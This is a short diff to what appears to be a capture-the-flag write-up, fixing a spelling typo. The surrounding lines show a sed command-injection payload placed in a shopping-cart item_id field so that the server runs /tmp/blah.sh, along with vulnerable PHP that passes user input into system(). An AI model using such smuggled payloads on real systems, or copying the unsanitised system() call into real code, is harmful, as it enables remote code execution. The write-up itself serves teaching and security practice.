@@ -763,7 +763,7 @@ sed -i '/item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '/d' /var/www/store/cart/us
 so this means that the `item_id` needs to be `1' -e "1e/tmp/blah.sh" /tmp/blah.sh '` lets go put whatever in the cart and intercept the post to remove it, and we can slap our payload in there with some urlencoding:  
 ![delete.png](delete.png)
 
-And ... disapointingly we get an `Invalid item` error, but that's not a big deal we have the source, lets have a closer look.
+And ... disappointingly we get an `Invalid item` error, but that's not a big deal we have the source, lets have a closer look.
 ```php
     if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
         system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
